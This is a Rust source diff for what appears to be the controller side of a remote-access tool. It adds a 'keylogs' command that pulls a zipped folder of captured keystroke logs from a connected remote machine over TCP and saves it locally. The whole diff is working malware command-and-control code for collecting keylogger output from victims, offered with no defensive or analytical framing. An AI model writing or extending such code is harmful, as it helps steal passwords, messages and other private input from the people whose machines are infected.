@@ -32,6 +32,8 @@ fn main() -> io::Result<()> {
                 .nth(1)
                 .expect("No file name provided");
             download_file(&mut stream, filename)?;
+        } else if trimmed_input.starts_with("keylogs") {
+            download_folder(&mut stream, "Logs", "keylogs")?;
         } else {
             send_message(&mut stream, trimmed_input)?;
             receive_response(&mut stream)?;
@@ -115,5 +117,29 @@ fn download_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
     }
 
     println!("File downloaded: {}", filename);
+    Ok(())
+}
+
+fn download_folder(stream: &mut TcpStream, folder_name: &str, command: &str) -> io::Result<()> {
+    let command = format!("{}", command);
+    send_message(stream, &command)?;
+
+    let mut size_buffer = [0; 8];
+    stream.read_exact(&mut size_buffer)?;
+    let file_size = u64::from_be_bytes(size_buffer);
+
+    let zip_filename = format!("{}.zip", folder_name);
+    let mut file = File::create(&zip_filename)?;
+    let mut total_bytes_read = 0;
+    let mut buffer = [0; 1024];
+
+    while total_bytes_read < file_size {
+        let n = stream.read(&mut buffer)?;
+        total_bytes_read += n as u64;
+        file.write_all(&buffer[..n])?;
+    }
+
+    println!("Folder downloaded as a zip file: {}", zip_filename);
+
     Ok(())
 }
